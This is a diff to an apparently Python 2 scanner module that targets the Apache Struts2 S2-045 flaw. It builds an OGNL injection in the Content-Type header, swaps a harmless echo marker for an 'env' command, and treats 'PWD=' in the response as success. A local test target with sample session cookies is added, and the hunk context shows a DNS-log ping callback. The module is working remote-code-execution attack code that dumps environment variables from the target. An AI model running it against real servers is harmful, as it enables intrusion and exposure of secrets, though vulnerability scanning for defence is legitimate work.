@@ -28,6 +28,8 @@ ping s2005.struts.99fd5e.dnslog.info
 import urlparse
 import requests
 from urllib import quote
+import urllib
+from requests.exceptions import ChunkedEncodingError
 from config import *
 
 
@@ -69,7 +71,7 @@ def verify(task):
     headers2 = {}
     headers2['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) " \
                             "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-    cmd = 'echo 35d33e01dfb4b2a2f72d66a413ea3d85'
+    cmd = 'env'
 
     #headers2['Content-Type'] = payload[type]
     headers2['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
@@ -98,8 +100,15 @@ def verify(task):
             'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
     found = False
     try:
-        resp = requests.post(url, data, headers=headers2, timeout=(5, 15), verify=False)
-        if "35d33e01dfb4b2a2f72d66a413ea3d85" in resp.content:
+        # req = urllib.Request(url)
+        # req.add_header('User-Agent', headers2['User-Agent'])
+        # req.add_header('Content-Type', headers2['Content-Type'])
+
+        # resp = urllib.urlopen(req)
+        # html = resp.read()
+        resp = requests.get(url, headers=headers2, timeout=(5, 15), verify=False)
+        html = resp.content
+        if "PWD=" in html:
             message["param"] = "S2-045"
             message["url"] = url
             message["method"] = "POST"
@@ -107,7 +116,7 @@ def verify(task):
             found = True
     except Exception as e:
         # print str(e)
-        logger.error(repr(e))
+        logger.error(repr(e) + url)
 
 
 
@@ -138,13 +147,19 @@ def verify(task):
 
 
 if __name__ == '__main__':
-    item = {
-        "url" : "",
-        "method" : "GET",
-        "request_header" : {},
-        "request_content" :"",
+    task = {
+        'url': 'http://127.0.0.1:8080/memoindex.action',
+        'request_header': {
+            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-GB,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Referer': 'http://127.0.0.1:8000/vulnerabilities/exec/',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Cookie': 'sessions=%7B%7D; csrftoken=71w812VAMB8nvVNcYgOmwW6ftN8igDyZsqE9FHz2MsGdQpgdmwpl1jzG2iE7YwLZ; sessionid=x4phtuh6qv5zhpcu46v1xlszto8pbib1; PHPSESSID=ktd1uec9ekucj6afr284i5bks6; security=low; hibext_instdsigdipv2=1',
+        },
+        'request_content': '',
+        'method': 'GET'
     }
-
-    a = FuzzStruts2(item)
-    a.runFuzz()
+    print verify(task)
 
